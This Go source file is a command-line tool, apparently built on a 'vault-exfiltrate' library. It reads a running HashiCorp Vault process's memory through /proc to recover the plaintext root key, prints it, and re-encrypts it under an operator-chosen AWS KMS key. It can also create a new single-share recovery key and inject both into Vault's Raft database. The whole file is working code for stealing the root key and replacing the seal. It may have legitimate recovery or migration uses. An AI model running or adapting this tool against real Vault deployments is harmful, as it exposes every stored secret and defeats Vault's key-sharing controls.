package main

import (
	"context"
	"crypto/rand"
	"errors"
	"flag"
	"fmt"
	"os"
	"strconv"
	"time"

	b64 "encoding/base64"
	"encoding/json"

	exfil "github.com/Dawnflash/vault-exfiltrate/lib"
	exfil_comp "github.com/Dawnflash/vault-exfiltrate/vault_components"
	"github.com/hashicorp/go-kms-wrapping/wrappers/awskms"
	bolt "go.etcd.io/bbolt"
	"google.golang.org/protobuf/proto"
)

const (
	DUMP_PATH_ROOT     = "vault_root_key.enc"
	DUMP_PATH_REC_KEY  = "vault_recovery_key.enc"
	DUMP_PATH_REC_CONF = "vault_recovery_conf.json"

	BOLT_PATH_ROOT     = "core/hsm/barrier-unseal-keys"
	BOLT_PATH_REC_KEY  = "core/recovery-key"
	BOLT_PATH_REC_CONF = "core/recovery-config"
	BOLT_PATH_KEYRING  = "core/keyring"

	TEMP_PATH_DB = "/tmp/vault_tmp.db"
)

var BOLT_OPTS = &bolt.Options{
	ReadOnly: false,
	Timeout:  1 * time.Second,
}

func mkDestDB(src string, dst string) {
	in, err := os.Open(src)
	panicErr(err)
	defer in.Close()
	out, err := os.Create(dst)
	panicErr(err)
	defer out.Close()
	_, err = out.ReadFrom(in)
	panicErr(err)
}

func panicErr(err error) {
	if err != nil {
		panic(err)
	}
}

func checkDB(db *bolt.DB) error {
	return db.View(func(tx *bolt.Tx) error {
		for err := range tx.Check() {
			return err
		}
		return nil
	})
}

// Attempt to retrieve a functional copy of the Raft DB without stopping Vault
func cloneDB(src string, retries int) *bolt.DB {
	for {
		mkDestDB(src, TEMP_PATH_DB)
		db, err := bolt.Open(TEMP_PATH_DB, 0666, BOLT_OPTS)
		panicErr(err)

		err = checkDB(db)
		if err == nil {
			fmt.Println("DB passed checks")
			return db
		}
		if retries > 0 {
			fmt.Printf("Database copy failed. Retrying. Attempts left: %d\n", retries)
			retries -= 1
		} else {
			panic(err)
		}
	}
}

func boltGet(db *bolt.DB, key string) ([]byte, error) {
	var data []byte
	err := db.View(func(tx *bolt.Tx) error {
		b := tx.Bucket([]byte("data"))
		if b == nil {
			return errors.New("DB: data bucket not found")
		}
		data = b.Get([]byte(key))
		if data == nil {
			return errors.New("DB: requested key not found")
		}
		return nil
	})
	return data, err
}

func boltPut(db *bolt.DB, key string, buf []byte) error {
	return db.Update(func(tx *bolt.Tx) error {
		b := tx.Bucket([]byte("data"))
		if b == nil {
			return errors.New("DB: data bucket not found")
		}
		return b.Put([]byte(key), buf)
	})
}

func getRootKey(pid int, db *bolt.DB) (rootKey []byte, err error) {
	keyring, err := boltGet(db, BOLT_PATH_KEYRING)
	if err != nil {
		return nil, err
	}

	regions, err := exfil.GetRegionsProc(pid)
	if err != nil {
		return nil, err
	}

	procMem, err := os.Open(fmt.Sprintf("/proc/%d/mem", pid))
	if err != nil {
		return nil, err
	}
	defer procMem.Close()

	for i := 0; i < len(regions); i++ {
		plaintext, err := exfil.FindMasterKeyInRegion(procMem, regions[i], keyring)
		if err == nil {
			k, err := exfil_comp.DeserializeKeyring(plaintext)
			if err != nil {
				return nil, err
			}
			return k.MasterKey(), err
		}
	}

	return nil, errors.New("key not found")
}

func dumpEncryptedRootKey(ctx context.Context, wrapper *awskms.Wrapper, db *bolt.DB, rootKey []byte) {
	pt, err := json.Marshal([][]byte{rootKey})
	panicErr(err)
	blob, err := wrapper.Encrypt(ctx, pt, nil)
	panicErr(err)
	blobBytes, err := proto.Marshal(blob)
	panicErr(err)
	err = os.WriteFile(DUMP_PATH_ROOT, blobBytes, 0644)
	panicErr(err)
}

func getKMSWrapper(keyId string) (*awskms.Wrapper, error) {
	w := awskms.NewWrapper(nil)
	_, err := w.SetConfig(map[string]string{
		"kms_key_id": keyId,
	})
	return w, err
}

func cmdDump(dbPath, kmsKeyId string, vaultPID int, recovery bool) {
	ctx := context.Background()
	copyRetries := 10 // max OS copy retries for a locked DB

	kmsWrapper, err := getKMSWrapper(kmsKeyId)
	panicErr(err)

	db := cloneDB(dbPath, copyRetries)
	defer os.Remove(TEMP_PATH_DB)
	defer db.Close()

	// extract root key from live memory (using the sealed keyring)
	rootKey, err := getRootKey(vaultPID, db)
	panicErr(err)
	fmt.Printf("Root key: %s\n", b64.StdEncoding.EncodeToString(rootKey))
	// re-encrypt the root key
	dumpEncryptedRootKey(ctx, kmsWrapper, db, rootKey)
	// (optionally) generate a new recovery key (AES-256), encrypt it, dump it
	// Also dump a recovery config and modify it to be 1/1 Shamir (avoid shares)
	if recovery {
		dumpNewRecoveryKey(ctx, kmsWrapper, db)
	}
	fmt.Println("Dumping successful. Stop Vault and re-run with the inject command.")
	if recovery {
		fmt.Println("Pass -r to the inject command to inject the new recovery key.")
	}
}

func cmdInject(dbPath string, recovery bool) {
	db, err := bolt.Open(dbPath, 0666, BOLT_OPTS)
	panicErr(err)
	defer db.Close()
	err = checkDB(db)
	panicErr(err)

	blobBytes, err := os.ReadFile(DUMP_PATH_ROOT)
	panicErr(err)
	err = boltPut(db, BOLT_PATH_ROOT, blobBytes)
	panicErr(err)
	fmt.Println("Injected encrypted root key")

	if recovery {
		blobBytes, err := os.ReadFile(DUMP_PATH_REC_KEY)
		panicErr(err)
		err = boltPut(db, BOLT_PATH_REC_KEY, blobBytes)
		panicErr(err)
		fmt.Println("Injected encrypted recovery key")

		blobBytes, err = os.ReadFile(DUMP_PATH_REC_CONF)
		panicErr(err)
		err = boltPut(db, BOLT_PATH_REC_CONF, blobBytes)
		panicErr(err)
		fmt.Println("Injected a single-share recovery key config")
	}
	fmt.Println("Injection complete. Configure Vault to use the desired KMS key.")
}

func dumpRecoveryConfig(db *bolt.DB) {
	var conf map[string]interface{}
	bConf, err := boltGet(db, BOLT_PATH_REC_CONF)
	panicErr(err)
	err = json.Unmarshal(bConf, &conf)
	panicErr(err)
	conf["secret_shares"] = 1
	conf["secret_threshold"] = 1
	blobBytes, err := json.Marshal(conf)
	panicErr(err)
	err = os.WriteFile(DUMP_PATH_REC_CONF, blobBytes, 0644)
	panicErr(err)
}

func dumpNewRecoveryKey(ctx context.Context, wrapper *awskms.Wrapper, db *bolt.DB) {
	// generate a new key
	pt := make([]byte, 32) // 256bit (AES-256) = 32B
	_, err := rand.Read(pt)
	panicErr(err)
	fmt.Printf("New recovery key: %s\n", b64.StdEncoding.EncodeToString(pt))
	blob, err := wrapper.Encrypt(ctx, pt, nil)
	panicErr(err)
	blobBytes, err := proto.Marshal(blob)
	panicErr(err)
	err = os.WriteFile(DUMP_PATH_REC_KEY, blobBytes, 0644)
	panicErr(err)

	dumpRecoveryConfig(db)
}

func main() {
	dbPath := flag.String("f", "/var/vault/vault.db", "Live Vault Raft storage location")
	kmsKeyId := flag.String("k", "", "Target AWS KMS key")
	recovery := flag.Bool("r", false, "Generate a new recovery key")

	flag.Parse()

	if _, err := os.Stat(*dbPath); err != nil {
		fmt.Println("Source DB does not exist!")
		flag.PrintDefaults()
		os.Exit(1)
	}

	cmd := flag.Arg(0)
	switch cmd {
	case "dump":
		vaultPID, err := strconv.Atoi(flag.Arg(1))
		if err != nil {
			fmt.Println("Pass a running Vault PID!")
			flag.PrintDefaults()
			os.Exit(1)
		}

		if *kmsKeyId == "" {
			fmt.Println("Target KMS key ID must be set!")
			flag.PrintDefaults()
			os.Exit(1)
		}

		cmdDump(*dbPath, *kmsKeyId, vaultPID, *recovery)
	case "inject":
		cmdInject(*dbPath, *recovery)
	default:
		fmt.Println("Unknown command. Use dump or inject.")
	}
}
